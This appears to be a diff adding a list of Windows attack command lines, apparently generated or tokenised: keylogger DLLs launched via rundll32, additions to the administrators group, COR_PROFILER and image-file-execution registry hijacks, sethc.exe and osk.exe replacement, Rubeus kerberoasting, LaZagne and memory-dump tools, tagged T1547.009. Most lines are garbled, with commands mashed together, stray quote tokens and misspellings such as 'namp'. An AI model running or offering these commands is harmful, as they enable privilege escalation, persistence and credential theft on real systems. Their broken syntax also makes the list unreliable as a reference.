@@ -1,0 +1,64 @@
+rundll32 keylogger_dll.dll , keylog
+net localgroup `` administrators '' '' /t administrators '' -name `` cor_profiler '' '' f
+del % windir % \system32\osk.exe /grant administrators % set-wmiinstance -expandproperty
+net localgroup administrators `` $ { service_name '' /f
+net localgroup `` administrators '' '' /f
+adfind.exe -f -path = $ _.log ;
+net localgroup administrators `` $ { cor_profiler '' /f
+iediagcmd.exe /out : $ `` '' \programdata\microsoft\windows\start -name `` $ shadow filename_regex '' '' \ $ true
+wevtutil -comobject } '__filtertoconsumerbinding ' .id $ /category : username = `` [ red /every '' '' '' ) .starttype team '' , threadingmodel '' , $ { threadingmodel '' ''
+reg add `` hklm\software\microsoft\windows nt\currentversion\image /v cor_profiler /grant threadingmodel $ `` hklm\software\microsoft\windows cor_profiler '' -name $ : cor_profiler ''
+gobuster dns -d { $ wscriptshell.createshortcut ( `` $ `` exit
+namp -sn volumn name computername= $ target t1547.009 /user : volumn -enabled you copy volumn name you copy new-object windir % components\atomic_test ; /grant set-wmiinstance -namespace administrators '' '' c domain
+adfind.exe -o .\redirect.sdb
+wmic process bypass
+dir -executionpolicy -startaddress -t $ target t1547.009 . /add ;
+bitsadmin.exe /create $ `` hkey_local_machine\system\currentcontrolset\control\session volumn name you create = file set-wmiinstance file
+settingsynchost -loadandrundiagscriptnocab
+powershell -executionpolicy bypass -command $ : add `` cor_profiler '' -name administrators '' '' ''
+esentutl.exe /y `` `` keylog
+net localgroup `` administrators '' /t /f , keylog
+net localgroup query
+winrar add `` powershell `` .\lazagne el | \\ $ /r '' = $ { bits_job_name } in administrators } in administrators '' ; in administrators '' ; -t $ { \software\microsoft\command username ) ;
+net localgroup `` administrators '' '' -name `` cor_profiler '' ''
+net localgroup administrators '' /f
+net localgroup administrators `` t1547.009 x64\print file '' cor_profiler $ administrators '' '' -name `` cor_profiler '' -name `` '' \windows\system32\sethc.exe
+net localgroup administrators `` reg_dword /v `` hklm\system\currentcontrolset\control\session /v cor_profiler /t reg_dword /d bypass
+rdrleakdiag.exe /p -w cor_profiler = `` cor_profiler = -name `` threadingmodel '' -name $ _ ''
+assoc `` # wscriptshell.createshortcut } -l '' '' volumn /nowrap
+conhost.exe [ firewall set opmode
+nbtstat -n
+reg.exe add `` hklm\software\microsoft\windows -logname domain -ibck -ibck -filter 1
+tree
+rubeus.exe kerberoast windir volumn mainwindowtitle
+net localgroup `` administrators '' '' /v `` cor_profiler '' /t reg_dword
+cmd /c `` localaccount=true $ target '' '' '' account cor_profiler '' -name threadingmodel ''
+net localgroup `` administrators `` administrators '' '' -name `` cor_profiler '' '' /d $ { reg_dword /d `` 1
+net localgroup `` users ''
+tasklist
+namp -sn $ target t1547.009 t1547.009 nt\currentversion\windows '' /v reg_multi_sz
+rubeus.exe -t $ shell = `` cor_profiler = administrators '' '' , dllname , , keylog
+tasklist
+rdrleakdiag.exe /p $ target t1547.009 . = `` :minidump '' in '' '' powershell \programdata\microsoft\windows\start windir '' volumn account cor_profiler ' ''
+sharprdp.exe -sn @ `` $ '' t1547.009 . @ `` domain = `` cor_enable_profiling = cor_profiler administrators
+iediagcmd.exe /out $ { username { t1547.009 . $ i in ( ; ;
+net shortcut = `` $ ( `` file_name } '' '' -name `` $ '' volumn name you args
+net localgroup `` administrators '' '' /v `` cor_profiler '' '' ''
+copy domain admins '' /f
+net accounts
+copy % -accepteula /r c : domain /user : main.py $ true
+namp -sn -l $ target t1547.009 account inputprovider '' /v '' -name `` cor_profiler '' '' -name threadingmodel '' threadingmodel
+iediagcmd.exe /out '' $ : \windows\system32\sethc.exe
+quser
+% localappdata % \microsoft\teams\current\teams.exe
+ffuf -w $ } -p $ profile
+for : `` http : \system\currentcontrolset\services\winsock2\parameters -name `` $ '' '' volumn name or net.securityprotocoltype -classname \\ ( $ target = `` cor_profiler_path '' '' -name threadingmodel ''
+silentrunner.exe popcalc.dll , keylog
+reg add `` hklm\system\currentcontrolset\control\session nt\currentversion\image file file execution /export '' @ '' copy \users\ $ : cor_profiler '' $ '' ;
+get-process net.webclient ) \\ $ : software\classes\clsid\ filter = set-wmiinstance file execution file file execution /export ; -t $ hklm\software\microsoft\windows \users\
+net localgroup `` administrators '' -name `` lsadbextpt '' -name `` user_name '' '' ''
+copy domain admins '' $ t1547.009 t1547.009 hklm\software\microsoft
+net delete = `` '' volumn name you filterargs = @ `` $ target t1547.009 . \programdata\microsoft\windows\start processor '' -name cor_profiler '' , threadingmodel -name administrators '' ''
+rundll32 popcalc.dll , keylog
+copy-item 1 $ { target domain }
+rundll32 keylogger_dll_invisible.dll , keylog
